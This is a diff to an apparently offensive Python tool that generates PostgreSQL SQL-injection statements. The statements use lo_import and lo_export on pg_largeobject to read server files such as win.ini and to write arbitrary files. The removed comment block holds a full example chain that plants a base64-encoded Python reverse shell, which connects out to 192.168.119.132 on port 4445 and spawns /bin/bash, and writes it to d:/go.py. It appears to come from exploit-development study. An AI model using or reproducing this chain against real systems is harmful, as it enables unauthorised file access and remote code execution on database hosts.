@@ -30,7 +30,7 @@ def upload_with_lo(data, filepath, loid=None, page=2048, noSpecLoid=False, encod
         LOID = '(select MAX(CAST(loid as int)) as gg from pg_largeobject)'
         for i in range(0, len(data), page):
             if encoder == 'base64':
-                _data = "decode('%s', 'base64')" % base64.b64encode(data[i:i+page])
+                _data = "decode('%s', 'base64')" % base64.b64encode(data[i:i+page]).decode()
             else:
                 _data = "decode('%s', 'hex')" % binascii.hexlify(data[i:i+page])
 
@@ -74,14 +74,4 @@ if __name__ == '__main__':
         print(read_text("c:\\windows\\win.ini"))
         print("\nwrite_text\n")
         print(write_text("hello world", "D:\\awae.txt"))
-
-
-'''
-Tree $ python3 sqli/pgsql/generate_sql.py --noloid --upload ../revshells/r.py -p d:/go.py
-remember to replace c:/windows/win.ini to /etc/hosts if target is Linux
-select lo_import( 'c:/windows/win.ini', (select case when count (*) > 0 then MAX(CAST(loid as int))+1 else 1337 end from pg_largeobject));
-with LL as (select MAX(CAST(loid as int)) as gg from pg_largeobject) update pg_largeobject set data=decode('b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTE5LjEzMiIsIDQ0NDUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKQo='', 'base64') from LL where loid=LL.gg and pageno=0;
-select lo_export((select MAX(CAST(loid as int)) as gg from pg_largeobject), 'd:/go.py');
-select lo_unlink((select MAX(CAST(loid as int)) as gg from pg_largeobject));
-'''
 
